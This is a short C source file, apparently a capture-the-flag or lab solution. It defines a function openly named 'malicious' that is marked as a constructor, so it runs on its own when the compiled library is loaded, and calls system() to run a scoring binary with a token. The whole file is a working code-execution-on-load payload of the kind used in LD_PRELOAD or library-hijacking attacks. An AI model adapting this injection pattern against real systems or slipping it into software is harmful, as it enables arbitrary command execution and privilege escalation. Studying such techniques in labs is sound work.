#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
	    system("/usr/local/bin/score 55b34945-0114-4332-bdfc-7829bde83c89");
}
